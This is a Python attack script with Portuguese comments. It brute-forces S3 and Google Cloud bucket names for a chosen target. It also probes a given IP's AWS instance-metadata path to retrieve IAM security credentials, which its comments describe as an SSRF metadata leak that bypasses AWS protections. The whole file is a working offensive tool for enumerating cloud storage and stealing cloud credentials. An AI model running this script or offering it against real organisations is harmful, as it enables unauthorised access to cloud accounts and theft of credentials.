import argparse
import requests
import json
import socket
from concurrent.futures import ThreadPoolExecutor

def brute_buckets(target_name):
    print(f"[*] Gerando Mutações para Buckets S3/Azure/GCP do alvo: {target_name}")
    suffixes = ["", "-prod", "-dev", "-logs", "-backup", "-static", "-assets", "-app", "-api"]
    results = []
    
    def check_bucket(url):
        try:
            r = requests.get(url, timeout=3)
            # 200 = Listagem habilitada
            # 403 = O Bucket existe! Útil para Bruteforce direcionado ou testes de WRITE
            if r.status_code in [200, 403]:
                return {"url": url, "status": r.status_code}
        except:
            pass
        return None

    urls_to_test = []
    for s in suffixes:
        urls_to_test.append(f"http://{target_name}{s}.s3.amazonaws.com")
        urls_to_test.append(f"https://storage.googleapis.com/{target_name}{s}")
        
    with ThreadPoolExecutor(max_workers=10) as executor:
        for res in executor.map(check_bucket, urls_to_test):
            if res:
                print(f"[+] Encontrado: {res['url']} (Status: {res['status']})")
                results.append(res)
    
    return results

def test_ssrf_metadata(ip_target):
    print(f"[*] Testando vazamento de Metadados via SSRF Proxy no IP: {ip_target}")
    # Payload formatado para bypassear barreiras v1/v2 da AWS
    headers = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
    try:
        r = requests.get(f"http://{ip_target}/latest/meta-data/iam/security-credentials/", headers=headers, timeout=5)
        if r.status_code == 200:
            print(f"[!] CRÍTICO: IAM Role Exposta: {r.text}")
    except:
        print("[-] Falha ou Timeout. SSRF Restrito.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--mode", choices=["buckets", "ssrf"], required=True)
    args = parser.parse_args()

    if args.mode == "buckets":
        brute_buckets(args.target)
    elif args.mode == "ssrf":
        test_ssrf_metadata(args.target)
